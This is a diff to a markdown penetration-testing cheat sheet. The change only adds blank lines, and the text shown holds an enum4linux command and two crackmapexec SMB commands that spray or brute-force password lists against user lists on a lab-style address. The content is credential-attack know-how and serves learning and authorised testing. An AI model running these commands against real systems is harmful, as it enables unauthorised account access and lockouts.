@@ -10,11 +10,13 @@ enum4linux -u 'username' -p 'password' -P <ip>
 
 ## Password Spray
 Test password against usernames in order. Won't brute force each password against each user.
+
 ```bash
 crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
 ```
 
 Test each password against each username. Careful of lockout policy.
+
 ```bash
 crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt
 ```
